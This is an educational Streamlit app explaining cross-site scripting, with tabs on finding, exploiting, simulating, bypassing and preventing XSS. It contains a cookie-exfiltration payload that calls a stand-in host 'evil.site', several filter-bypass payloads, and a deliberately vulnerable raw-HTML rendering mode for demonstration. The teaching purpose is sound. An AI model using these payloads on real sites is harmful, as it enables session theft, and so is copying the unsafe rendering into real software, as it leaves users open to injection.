import streamlit as st
import html

st.set_page_config(page_title="XSS demonstration", layout="wide")
st.title("XSS Attacks Explained")

tab1, tab2, tab3, tab4, tab5 = st.tabs([
    "Finding XSS", 
    "Exploiting", 
    "Simulate", 
    "Bypass", 
    "Defend"
])

with tab1:
    st.subheader("How Hackers Find XSS")
    st.markdown("""
Hackers typically find XSS vulnerabilities through:

1. Inspecting inputs like search forms, comment boxes, login fields.
2. Reflected responses, i.e, does input appear in HTML output?
3. Manual injection:
```html
<script>alert('XSS')</script>
```
4. Using tools:
   - [XSStrike](https://github.com/s0md3v/XSStrike)
   - [XSSer](https://github.com/epsylon/xsser)
   
**Here's an example on how XSSer can be used to find parameters succeptable to XSS:**
""")
    video_path = "cyber-labs/xss-lab/xsser.mp4"
    with open(video_path, "rb") as video_file:
        video_bytes = video_file.read()
    st.video(video_bytes)
    st.markdown("""
    5. Inspecting dev tools: Look for unsafe DOM injections.

    Try testing with:
    ```html
    <svg onload=alert(1)>
    <img src=x onerror=alert(1)>
    ```
    """)

with tab2:
    st.subheader("How Hackers Exploit XSS")
    st.markdown("""
Once an XSS is found, attackers might:

- Steal cookies:
```html
<script>fetch('https://evil.site?cookie=' + document.cookie)</script>
```
- Deface pages:
```html
<script>document.body.innerHTML = 'Hacked!'</script>
```
- Run keyloggers, crypto miners, or redirect users
- Use social engineering (e.g., fake login prompts)

Tools often used:
- Burp Suite (manual testing + fuzzing)
- BeEF (browser exploitation framework)
""")


symbols = ["<", ">", "&"]

with tab3:
    st.subheader("XSS Simulation")
    st.markdown("""
Try injecting HTML/JS below. Toggle views to see the difference.
""")

    user_input = st.text_area("User Input", "<b>Hello!</b>", height=100)
    view_mode = st.radio("Choose rendering mode:", ["Safe View (Sanitized)", "Vulnerable View (Raw HTML)"])

    st.markdown("---")
    st.subheader("Rendered Output")

    if view_mode == "Safe View (Sanitized)":
        sanitized = html.escape(user_input)
        st.code(sanitized)
        st.markdown(f"```")
        st.markdown(sanitized)
        st.markdown("```")
        st.success("Output escaped. No scripts run.")
    else:
        st.markdown(user_input, unsafe_allow_html=True)
        if "<script" in user_input.lower():
            st.warning("Now, the injected code would run as Javascript here in a real vulnerable site")
            st.warning("For example, if you had ran '<script>alert(1)</script>', you would see a pop-up on an actual vulnerable site that says '1'")
        else:
            for symbol in symbols:
                if symbol in user_input:
                    st.error("Vulnerable: Input rendered as raw HTML.")
                    break

with tab4:
    st.subheader("Bypassing Filters")
    st.markdown("""
Attackers evade protections using:

- Obfuscation:
```html
<scr<script>ipt>alert(1)</script>
```
- Encoded tags:
```html
%3Cscript%3Ealert(1)%3C/script%3E
```
- Alternate vectors:
```html
<input onfocus=alert(1) autofocus>
<svg onload=alert(1)>
```

Advanced tools generate bypass payloads:
- XSStrike fuzzes and finds filtered contexts
- Burp Suite encodes payloads in real time
""")

with tab5:
    st.subheader("How Developers Prevent XSS")
    st.markdown("""
To defend against XSS

1. Escape Output:
   - Encode `<`, `>`, `"`, `'`, and `&`
   - Use `html.escape()` or frameworks with built-in escaping

2. Validate Input:
   - Use allowlists for expected content (e.g., `a-z`, `0-9`)
   - Strip HTML if not explicitly needed

3. Use Secure Functions:
   - Prefer `textContent` over `innerHTML`
   - Avoid direct DOM manipulation with user data

4. Security Headers:
   - `Content-Security-Policy`: disallow inline scripts
   - `X-XSS-Protection`: legacy browser protection

5. Libraries:
   - Use [DOMPurify](https://github.com/cure53/DOMPurify) for safe HTML sanitization
""")
